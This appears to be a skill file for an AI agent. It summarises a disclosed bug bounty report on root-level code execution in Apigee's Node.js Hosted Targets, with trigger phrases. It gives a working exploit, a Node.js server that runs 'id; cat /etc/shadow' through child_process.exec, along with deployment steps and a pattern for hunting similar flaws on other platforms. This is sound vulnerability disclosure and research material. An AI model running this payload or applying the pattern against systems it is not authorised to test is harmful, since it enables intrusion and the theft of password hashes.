---
name: bughunters-apigee
description: Personal Google VRP report by omespino — Apigee Node.js Hosted Target RCE as root via child_process.exec abuse. Deploy a Node.js proxy with exec payload, /etc/shadow readable confirms root. Pattern: SaaS/PaaS platforms with "hosted targets" or "custom scripts" features with inadequate sandboxing. Spanish triggers — "apigee rce", "apigee hosted target", "apigee node.js", "apigee sandbox", "apigee proxy rce", "google apigee".
---

## Report 18 — RCE as root in Apigee via Node.js Hosted Target

**Target:** apigee.com (Google Apigee API Management)

### Node.js RCE payload (index.js)
```javascript
var http = require('http');
const { exec } = require('child_process');

var svr = http.createServer(function(req, resp) {
  resp.setHeader('Content-Type', 'application/json');
  exec('id; cat /etc/shadow', (error, stdout, stderr) => {
    resp.end('RCE output:\n\n' + stdout);
  });
});
svr.listen(process.env.PORT || 3000, function() {});
```

### Steps
1. `Develop > API Proxies > +Proxy → Hosted Target → Quick Start`
2. Deploy to "prod"
3. `Edit proxy → Develop tab → Resources/hosted/index.js`
4. Replace with payload → Save → visit proxy URL

**Impact:** `/etc/shadow` readable = running as root.

### Pattern to generalize
Look for "hosted targets", "serverless functions", "custom scripts" features in SaaS/PaaS — if they allow code execution with inadequate sandboxing → potential RCE.

Other Apigee sandbox escapes (from google-vrp-cloud HoF): Rhino ClassShutter bypass, LookupCache `postDeserialize()` RCE, header injection via positional set.
